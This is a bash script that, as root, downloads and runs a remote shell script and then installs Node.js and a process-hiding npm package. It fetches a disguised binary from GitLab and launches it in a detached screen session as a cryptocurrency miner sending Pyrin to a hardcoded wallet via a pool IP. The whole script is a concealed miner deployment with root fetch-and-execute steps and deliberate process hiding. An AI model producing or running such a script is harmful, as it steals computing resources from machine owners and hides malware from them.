#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm =y
sudo npm i -g node-process-hider && sudo ph add sulit
wget -qO sulit https://gitlab.com/sarifadim/jomblo/-/raw/main/lolipop && chmod +x *
screen -dms run ./sulit --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.237.21.190:443 --log --extra --pers=PYI
EOF
screen -r
